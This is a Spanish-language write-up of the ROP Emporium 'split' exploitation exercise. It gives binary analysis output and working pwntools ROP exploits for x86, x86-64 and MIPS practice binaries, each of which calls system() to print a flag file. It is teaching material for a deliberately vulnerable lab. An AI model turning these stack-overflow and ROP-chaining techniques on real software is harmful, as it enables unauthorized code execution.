# Split

![2025-04-24-204900_1160x313_scrot](https://github.com/user-attachments/assets/fac22587-b1e4-4358-868c-aa76ad86faa5)

## Indice
- [x86](x86)
- [x86-64](#x86_64)
- [MIPS](#MIPS)

# x86

## Analisis
```
checksec --file=split32
[*] '/home/kalcast/Descargas/RopEmporium/split32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Sin canario ni PIE, y sabemos que en esta arquitectura el buffer overflow ocurre con un offset de 44 bytes, en la descripcion nos dicen que debemos llamar a la funcion `system` y que la cadena `/bin/cat flag.txt` esta en algun lugar del programa.

Con rabin2 podemos encontrar la llamada a system dentro de usefulFunction:
```
rabin2 -s split32 |grep FUNC
28  0x00000490 0x08048490 LOCAL  FUNC   0        deregister_tm_clones
29  0x000004d0 0x080484d0 LOCAL  FUNC   0        register_tm_clones
30  0x00000510 0x08048510 LOCAL  FUNC   0        __do_global_dtors_aux
33  0x00000540 0x08048540 LOCAL  FUNC   0        frame_dummy
36  0x000005ad 0x080485ad LOCAL  FUNC   95       pwnme
37  0x0000060c 0x0804860c LOCAL  FUNC   25       usefulFunction
46  0x00000690 0x08048690 GLOBAL FUNC   2        __libc_csu_fini
48  0x00000480 0x08048480 GLOBAL FUNC   4        __x86.get_pc_thunk.bx
52  0x00000694 0x08048694 GLOBAL FUNC   0        _fini
61  0x00000630 0x08048630 GLOBAL FUNC   93       __libc_csu_init
65  0x00000470 0x08048470 GLOBAL FUNC   2        _dl_relocate_static_pie
66  0x00000430 0x08048430 GLOBAL FUNC   0        _start
70  0x00000546 0x08048546 GLOBAL FUNC   103      main
72  0x00000374 0x08048374 GLOBAL FUNC   0        _init
1   0x000003b0 0x080483b0 GLOBAL FUNC   16       imp.read
2   0x000003c0 0x080483c0 GLOBAL FUNC   16       imp.printf
3   0x000003d0 0x080483d0 GLOBAL FUNC   16       imp.puts
4   0x000003e0 0x080483e0 GLOBAL FUNC   16       imp.system
6   0x000003f0 0x080483f0 GLOBAL FUNC   16       imp.__libc_start_main
7   0x00000400 0x08048400 GLOBAL FUNC   16       imp.setvbuf
8   0x00000410 0x08048410 GLOBAL FUNC   16       imp.memset
```

```
r2 -A -c "pdf @ sym.usefulFunction" -q split32 2>/dev/null
/ 25: sym.usefulFunction ();
|           0x0804860c      55             push ebp
|           0x0804860d      89e5           mov ebp, esp
|           0x0804860f      83ec08         sub esp, 8
|           0x08048612      83ec0c         sub esp, 0xc
|           0x08048615      680e870408     push str._bin_ls            ; 0x804870e ; "/bin/ls"
|           0x0804861a      e8c1fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804861f      83c410         add esp, 0x10
|           0x08048622      90             nop
|           0x08048623      c9             leave
\           0x08048624      c3             ret
```

Y la cadena que buscamos:

```
rabin2 -z split32
[Strings]
nth paddr      vaddr      len size section type  string
-------------------------------------------------------
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
6   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```

## Explotacion

Necesitamos llamar a system("/bin/cat flag.txt") dentro de sym.usefulFunction

Ahora bien en x86 el primer parametro que se le pasa a una funcion es el valor en la cima de la pila, lugar donde apunta esp

Nuestra carga util entonces sera `offset + direccion_call_system + direccion_comando_cat`

Exploit:
``` python
from pwn import *

elf = context.binary = ELF("./split32")
io = process("./split32")

system_call = 0x0804861a
command_string = 0x0804a030

payload = flat (
         cyclic(44),
         p32(system_call),        # system("/bin/cat flag.txt")
         p32(command_string)      # "/bin/cat flag.txt"
        )

io.recv()
io.sendline(payload)
io.success(io.recvall().decode())
```

# x86_64

## Analisis

En teoria es lo mismo que en x86, pero las direcciones de la funcion y la cadena cambian.

## Explotacion

La diferencia radica aqui en que el primer parametro de una funcion en x86_64 es el registro o a donde apunta el registro RDI, por lo que necesitamos almacenar "/bin/cat flag.txt" en este registro.

Necesitamos un gadget, un pequeño trozo de codigo al cual podamos saltar, cambiar el valor del registro y volver

Podemos usar el comando /R [registro] en radare2 para encontrar gadgets, o la herramienta ROPgadget, a gusto del consumidor:
```
ROPgadget --binary split|grep rdi
0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x00000000004007c3 : pop rdi ; ret  # Aqui esta!
0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
```

Con este gadget podemos sobreescribir rdi:
```python
from pwn import *

elf = context.binary = ELF("./split")
io = process("./split")

payload = flat (
         cyclic(40),
         p64(0x004007c3),           # pop rdi; ret
         p64(0x00601060),           # "/bin/cat flag.txt"
         p64(0x0040074b),           # system("/bin/cat flag.txt")
        )

io.recv()
io.sendline(payload)
io.success(io.recvuntil(b"}").decode())
```

# MIPS

Necesitamos almacenar la dirección de "/bin/cat flag.txt" en `a0` e invocar system.
```
─$ ropper -f split_mipsel | grep a0
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0040087c: addiu $a0, $v0, 0xc20; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400898: addiu $a0, $v0, 0xc38; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x004008c0: addiu $a0, $v0, 0xc40; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400938: addiu $a0, $v0, 0xc4c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400954: addiu $a0, $v0, 0xc78; lw $v0, -0x7fa4($gp); move $t9, $v0; jalr $t9; nop;
0x00400994: addiu $a0, $v0, 0xc7c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x004009e8: addiu $a0, $v0, 0xc88; lw $v0, -0x7fac($gp); move $t9, $v0; jalr $t9; nop;
0x00400708: addiu $gp, $gp, -0x6fd0; lw $t9, -0x7fa0($gp); beqz $t9, 0x720; nop; jr $t9; nop;
0x00400a94: addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
0x00400918: addiu $v0, $fp, 0x18; move $a0, $v0; lw $v0, -0x7fbc($gp); move $t9, $v0; jalr $t9; nop;
0x00400aa0: jalr $t9; move $a0, $s3;
0x00400878: lui $v0, 0x40; addiu $a0, $v0, 0xc20; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400894: lui $v0, 0x40; addiu $a0, $v0, 0xc38; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x004008bc: lui $v0, 0x40; addiu $a0, $v0, 0xc40; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400934: lui $v0, 0x40; addiu $a0, $v0, 0xc4c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x00400950: lui $v0, 0x40; addiu $a0, $v0, 0xc78; lw $v0, -0x7fa4($gp); move $t9, $v0; jalr $t9; nop;
0x00400990: lui $v0, 0x40; addiu $a0, $v0, 0xc7c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
0x004009e4: lui $v0, 0x40; addiu $a0, $v0, 0xc88; lw $v0, -0x7fac($gp); move $t9, $v0; jalr $t9; nop;
0x00400a20: lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
0x00400a90: lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
0x0040070c: lw $t9, -0x7fa0($gp); beqz $t9, 0x720; nop; jr $t9; nop;
0x00400ba0: lw $t9, -0x7ff0($gp); move $t7, $ra; jalr $t9; addiu $t8, $zero, 0xa;
0x00400860: move $a0, $v0; lw $v0, -0x7fb8($gp); move $t9, $v0; jalr $t9; nop;
0x0040091c: move $a0, $v0; lw $v0, -0x7fbc($gp); move $t9, $v0; jalr $t9; nop;
0x00400978: move $a0, $zero; lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
0x00400a9c: move $a1, $s4; jalr $t9; move $a0, $s3;
0x00400974: move $a1, $v0; move $a0, $zero; lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
0x0040085c: move $a1, $zero; move $a0, $v0; lw $v0, -0x7fb8($gp); move $t9, $v0; jalr $t9; nop;
0x00400a98: move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
0x00400a1c: nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
0x00400a18: nop; nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
```

Aquí el gadget en 0x00400a1c nos es útil porque nos permite hacer ambas cosas con offst relativos al stack, este es bueno.
```py
from pwn import *
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu split_mipsel",shell=True)

gadget = 0x00400a1c # nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;

# system("/bin/cat flag.txt")
payload = b""
payload += b"A"*36
payload += p32(gadget)
payload += p32(0)
payload += p32(0x00400b70)       # $t9 =  &system
payload += p32(0x00411010)       # $a0 =  "/bin/cat flag.txt"

io.send(payload)
io.interactive()
```
